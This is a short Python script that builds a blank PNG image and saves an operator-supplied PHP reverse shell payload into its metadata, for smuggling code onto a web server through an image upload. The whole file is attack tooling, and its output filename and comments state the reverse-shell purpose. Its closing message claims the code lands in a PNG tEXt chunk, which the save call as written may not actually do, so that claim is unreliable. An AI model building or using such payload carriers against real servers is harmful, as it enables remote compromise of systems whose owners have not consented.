#!/usr/bin/env python3
"""Generate a 1920x1080 PNG with PHP reverse shell code embedded in image metadata."""

from PIL import Image
import io

# Create a black 1920x1080 PNG
img = Image.new('RGB', (1920, 1080), color='black')

# PHP reverse shell payload
payload=input("Enter Payload Here: ")


# Embed PHP code in PNG text chunks (metadata comments)
img.save(
    '/home/surzal/Desktop/reverse_shell.png',
    'PNG',
    comment=payload
)

print("Created reverse_shell.png (1920x1080) with embedded PHP payload.")
print(f"PHP code stored in PNG tEXt chunk metadata.")
